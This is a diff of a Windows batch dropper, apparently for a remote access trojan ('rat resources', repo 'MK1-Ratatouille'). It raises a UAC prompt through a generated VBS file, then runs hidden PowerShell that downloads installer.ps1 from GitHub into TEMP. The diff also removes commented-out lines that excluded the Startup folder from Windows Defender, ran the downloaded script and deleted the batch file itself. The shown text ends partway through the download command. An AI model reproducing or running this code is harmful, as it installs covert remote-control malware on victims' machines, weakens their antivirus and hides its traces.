@@ -17,7 +17,7 @@ if '%errorlevel%' NEQ '0' (
 
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
+    set params=%*
     echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
     "%temp%\getadmin.vbs"
@@ -29,22 +29,9 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------   
 
-@REM REM disable defender and execute downloaded script
-@REM powershell -windowstyle hidden -Command ^
-@REM "try { ^
-@REM     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
-@REM     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
-@REM     .\installer.ps1; ^
-@REM } catch { ^
-@REM     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
-@REM }"
-
-
-@REM powershell Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ./installer.ps1
-@REM REM self delete
-@REM del "%~f0"
-
 REM Disable Windows Defender and execute the downloaded script
+
+REM rat resources
 powershell -windowstyle hidden -Command ^
 "try { ^
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile '$env:TEMP\installer.ps1'; ^
